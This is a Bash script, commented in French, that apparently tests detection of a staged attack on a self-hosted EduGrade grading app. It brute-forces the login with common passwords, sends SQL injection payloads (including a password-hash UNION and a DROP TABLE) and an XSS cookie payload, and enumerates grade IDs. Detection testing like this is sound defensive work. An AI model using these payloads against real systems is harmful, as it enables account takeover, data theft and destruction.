#!/usr/bin/env bash
# Scénario d'attaque FICTIVE contre EduGrade déployé sur k3s, pour vérifier la
# détection (Loki, tableau de bord « Sécurité EduGrade », alertes Grafana).
# Comptes et données fictifs ; à lancer uniquement contre son propre cluster.
#
#   1. force brute sur /login (12 mots de passe faux pour l'enseignante) ;
#   2. connexion réussie avec le bon mot de passe (compte compromis) ;
#   3. injections SQL et XSS dans la recherche d'étudiants ;
#   4. énumération IDOR des notes par une étudiante.
set -uo pipefail
BASE="${1:-http://edugrade.localhost}"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT

csrf() { curl -s -c "$JAR" -b "$JAR" "$BASE/login" | grep -o 'name="csrf_token"[^>]*value="[^"]*"' | sed 's/.*value="//;s/"$//'; }
login() { # $1 email, $2 mot de passe -> code HTTP
  local t; t="$(csrf)"
  curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -b "$JAR" -X POST "$BASE/login" \
    --data-urlencode "csrf_token=$t" --data-urlencode "email=$1" --data-urlencode "password=$2"
}

echo "[$(date +%T)] 1. Force brute sur claire.dubois@edugrade.test"
for pw in 123456 password azerty claire edugrade 2026 Claire2026 claire2025 admin motdepasse qwerty letmein; do
  printf '   essai %-12s -> HTTP %s\n' "$pw" "$(login claire.dubois@edugrade.test "$pw")"
done

echo "[$(date +%T)] 2. Connexion réussie (compte de démonstration)"
echo "   -> HTTP $(login claire.dubois@edugrade.test claire2026)"

echo "[$(date +%T)] 3. Injections dans /teacher/students?q="
for q in "' OR '1'='1" "%' UNION SELECT id, name, password_hash FROM users --" "<script>alert(document.cookie)</script>" "'; DROP TABLE grades; --"; do
  code=$(curl -s -o /tmp/attack.html -w '%{http_code}' -b "$JAR" -G "$BASE/teacher/students" --data-urlencode "q=$q")
  rows=$(grep -c 'data-testid="student-row"' /tmp/attack.html)
  printf '   %-55s -> HTTP %s, %s ligne(s), hachage divulgué : %s\n' "$q" "$code" "$rows" "$(grep -q 'scrypt:' /tmp/attack.html && echo OUI || echo non)"
done

echo "[$(date +%T)] 4. Énumération IDOR par lina.bensalah@edugrade.test"
rm -f "$JAR"; login lina.bensalah@edugrade.test lina2026 >/dev/null
for id in 4 5 6 7 8 9; do
  printf '   GET /grades/%s -> HTTP %s\n' "$id" "$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" "$BASE/grades/$id")"
done
echo "[$(date +%T)] Scénario terminé : vérifier Grafana « Sécurité EduGrade » et les alertes."
